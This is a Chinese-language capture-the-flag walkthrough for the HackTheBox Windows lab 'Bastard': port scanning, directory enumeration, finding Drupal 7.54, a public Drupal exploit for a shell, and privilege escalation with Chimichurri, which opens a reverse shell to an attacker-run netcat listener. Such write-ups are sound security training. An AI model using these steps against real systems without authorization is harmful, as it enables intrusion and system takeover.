# Bastard

- **Bastard是hackthebox上一台难度中等的windows靶机**

### 信息收集

- nmap进行端口扫描，首先扫描前100个容易受到攻击的端口

![0.9](https://herozql.oss-cn-beijing.aliyuncs.com/main/0.9.png)

- nmap进行更细致的扫描

![1](https://herozql.oss-cn-beijing.aliyuncs.com/main/1.png)

- nmap扫描是否存在漏洞

![2](https://herozql.oss-cn-beijing.aliyuncs.com/main/2.png)

- 至此，nmap向我们反馈了有用的信息：

```
80 http
135 msrpc
49154 open unknow
```

- 登录80端口，查看网页信息

![0.1](https://herozql.oss-cn-beijing.aliyuncs.com/main/0.1.png)

- 我们从网页底部可以知道这个CMS是drupal系统，但是我们不知道他的具体版本
- 接下来使用dirsearch进行目录扫描，我尝试使用gobuster 进行扫描，但是结果并能使人满意，可能这次并不适用于用gobuster扫描，有时候最好同时使用这两个工具进行扫描，并且更换不同的字典然后进行多次扫描，可能会费时费力，但是收集有用的信息对我们来说是非常重要的

``` 
dirsearch -u http://10.129.189.21 -x 403 -t 200
```

![0.15](https://herozql.oss-cn-beijing.aliyuncs.com/main/0.15.png)

- 我们发现了许多文件，其中CHAGELOG.txt文件中有这CMS的版本信息，我们可以查看到

![0.2](https://herozql.oss-cn-beijing.aliyuncs.com/main/0.2.png)

- 当然，我也参考了别人的walkthrough，他们扫描出了/rest 文件夹，我试着使用它们的字典以及工具进行扫描，扫描时间实在太长，而且我们完全可以不使用 /rest 文件就能达到我们的渗透目的
- 接下来使用searchsploit 对 drupal 7.54 版本进行扫描

![3.9](https://herozql.oss-cn-beijing.aliyuncs.com/main/3.9.png)



### 漏洞利用

- 使用 44449.rb 脚本

![4](https://herozql.oss-cn-beijing.aliyuncs.com/main/4.png)

![5](https://herozql.oss-cn-beijing.aliyuncs.com/main/5.png)

![4.5](https://herozql.oss-cn-beijing.aliyuncs.com/main/4.5.png)

- 我们得到了一个shell，这是我在参考了许多walkthrough后得到的最快捷的方式

- 查看系统信息

![6](https://herozql.oss-cn-beijing.aliyuncs.com/main/6.png)



### 权限提升

- 下载使用[Chimichurri](https://github.com/mxrmiss/Chimichurri)脚本

![7](https://herozql.oss-cn-beijing.aliyuncs.com/main/7.png)

- 在windows靶机中接收脚本文件

![8](https://herozql.oss-cn-beijing.aliyuncs.com/main/8.png)

- 本地机器nc监听端口
- 靶机上使用脚本文件

```
chimichurri.exe ip port
```

- 查看之前监听的端口(可能一次不一会成功，需要多试几次)

![9](https://herozql.oss-cn-beijing.aliyuncs.com/main/9.png)

- 结束